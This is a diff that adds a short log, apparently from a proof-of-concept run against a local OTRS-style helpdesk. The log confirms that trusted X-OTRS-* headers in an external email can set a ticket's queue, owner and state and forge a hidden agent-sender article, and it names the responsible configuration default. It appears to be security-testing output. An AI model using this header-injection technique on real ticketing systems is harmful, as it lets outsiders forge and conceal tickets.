@@ -1,0 +1,10 @@
+==========================================================================
+VULN-003: Unauth X-OTRS-* header injection via trusted inbound mail
+Target: http://localhost:25114
+[INFO] PostMaster.pm:92 Trusted default 1; NewTicket.pm honours X-OTRS-SenderType/Queue/Owner/State
+==========================================================================
+[STEP] piping the crafted external email through Maint::PostMaster::Read (TRUSTED, as the mail pipe)
+[INFO] PostMaster::Read rc=0
+[PROOF] created ticket: [['2026092910000792', 'Junk', '2', 'closed successful', 'agent', '0']]
+[OK] exploit confirmed — an external email created ticket 2026092910000792 with ALL attacker-chosen control fields honoured: queue=Junk, owner_uid=2, state=closed successful, and a forged AGENT-sender article hidden from the customer — X-OTRS-* headers are trusted by default.
+==> VULN-003: CONFIRMED — an external email created ticket 2026092910000792 with ALL attacker-chosen control fields honoured: queue=Junk, owner_uid=2, state=closed successful, and a forged AGENT-sender article hidden from the customer — X-OTRS-* headers are trusted by default.
